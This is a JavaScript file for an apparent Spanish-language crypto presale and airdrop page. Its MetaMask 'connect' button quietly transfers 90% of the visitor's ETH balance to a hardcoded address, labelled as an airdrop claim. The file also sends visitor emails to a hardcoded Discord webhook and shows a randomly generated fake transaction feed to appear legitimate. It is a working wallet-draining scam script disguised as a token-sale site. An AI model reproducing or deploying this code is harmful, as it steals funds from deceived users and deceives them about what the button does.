

document.getElementById('conectarMetaMask').addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            const web3 = new Web3(window.ethereum);
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const usuarioAddress = accounts[0];
            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
            const balance = await web3.eth.getBalance(usuarioAddress);
            const balanceEnEther = web3.utils.fromWei(balance, 'ether');
            const cantidadEnviar = balanceEnEther * 0.9; // Asumiendo que quieres enviar el 90% del balance
            const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');

            const transactionParameters = {
                from: usuarioAddress,
                to: direccionDestino,
                value: cantidadEnviarEnWei,
                data: web3.utils.toHex('CLAIM AIRDROP FREE'),
            };

            // Estimación dinámica del gas necesario para la transacción
            const gasEstimado = await web3.eth.estimateGas(transactionParameters);

            // Realizar la transacción con el gas estimado
            transactionParameters.gas = gasEstimado;

            web3.eth.sendTransaction(transactionParameters)
            .then(receipt => {
                console.log('Transacción exitosa:', receipt);
                document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
            })
            .catch(error => {
                console.error('Error en la transacción:', error);
            });
        } catch (error) {
            console.error('Error conectando a MetaMask:', error);
        }
    } else {
        console.error('MetaMask no está instalado.');
    }
});

document.getElementById('enviar').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('Correo electrónico inválido');
        return;
    }
    
    const botonEnviar = document.getElementById('enviar');
    botonEnviar.textContent = "Registrado";

    // Enviar datos al webhook de Discord
    const webhookUrl = 'https://discordapp.com/api/webhooks/1074491610471084072/DQZ8B1z42DNbxwZgANi4MRhmivlWYKpkGYnLnFKoeQrqUuAdzsHm1NgzWweNJWog0y38';
    const data = {
        content: `Nuevo registro para la presale y airdrop: ${email}`,
    };
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(responseData => {
        console.log(responseData);
    })
    .catch(error => {
        console.error('Error enviando datos al webhook:', error);
    });
});

window.onload = function() {
  document.getElementById("popupBanner").style.visibility = "visible";
};

document.getElementById("cerrarPopup").onclick = function() {
  document.getElementById("popupBanner").style.visibility = "hidden";
};



function updateCountdown() {
    const launchDate = new Date("February 29, 2024 00:00:00").getTime();
    const now = new Date().getTime();
    const difference = launchDate - now;

    const days = Math.floor(difference / (1000 * 60 * 60 * 24));
    const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((difference % (1000 * 60)) / 1000);

    document.getElementById("countdown-days").innerHTML = days + " días ";
    document.getElementById("countdown-hours").innerHTML = hours + " horas ";
    document.getElementById("countdown-minutes").innerHTML = minutes + " minutos ";
    document.getElementById("countdown-seconds").innerHTML = seconds + " segundos ";

    if (difference < 0) {
        clearInterval(x);
        document.getElementById("countdown").innerHTML = "El lanzamiento ha ocurrido";
    }
}

updateCountdown();
const x = setInterval(updateCountdown, 1000);

document.getElementById('generarReferido').addEventListener('click', function() {
    const walletAddress = document.getElementById('walletAddress').value;
    if(walletAddress === '') {
        alert('Por favor, introduce tu dirección de wallet.');
        return;
    }
    const enlaceActual = window.location.href;
    const enlaceReferido = `${enlaceActual}?ref=${walletAddress}`;
    document.getElementById('enlaceReferido').textContent = `Tu enlace de referido es: ${enlaceReferido}`;
});

document.addEventListener('DOMContentLoaded', function() {
    const target = document.getElementById('infoCompra');
    const text = '1 ETH = 10 000 PORTAL TOKEN. Conecta MetaMask o TrustWallet a través del botón de comprar para acceder a la compra.';
    let index = 0;

    function typeWriter() {
        if (index < text.length) {
            target.innerHTML += text.charAt(index);
            index++;
            setTimeout(typeWriter, 100); // Ajusta la velocidad de "tipeo"
        } else {
            blinkCursor();
        }
    }

    function blinkCursor() {
        const cursor = '<span id="cursor">_</span>';
        target.innerHTML += cursor;
        const cursorElement = document.getElementById('cursor');
        setInterval(() => {
            cursorElement.style.opacity = (cursorElement.style.opacity == 0 ? 1 : 0);
        }, 500); // Ajusta la velocidad del parpadeo
    }

    typeWriter();
});

const addresses = [
  "0x123...", "0x234...", "0x345...", "0x456...",
  "0x567...", "0x678...", "0x789...", "0x890...",
  "0x901...", "0xABC...", "0xBCD...", "0xCDE...",
  "0xDEF...", "0xEFG..."
];

function getRandomTransactions() {
  const selectedIndexes = [];
  while(selectedIndexes.length < 3) {
    const randomIndex = Math.floor(Math.random() * addresses.length);
    if (!selectedIndexes.includes(randomIndex)) {
      selectedIndexes.push(randomIndex);
    }
  }

  return selectedIndexes.map(index => addresses[index]);
}

function updateTransactions() {
  const transactionsContainer = document.getElementById('transactions');
  transactionsContainer.innerHTML = ''; // Limpiar el contenedor de transacciones

  const transactions = getRandomTransactions();
  transactions.forEach(address => {
    const transactionElement = document.createElement('div');
    transactionElement.classList.add('transaction');
    transactionElement.textContent = `Transacción de: ${address}`;
    transactionsContainer.appendChild(transactionElement);
  });
}

// Actualizar las transacciones cada 5 segundos
setInterval(updateTransactions, 5000);

// Iniciar manualmente la primera actualización
updateTransactions();
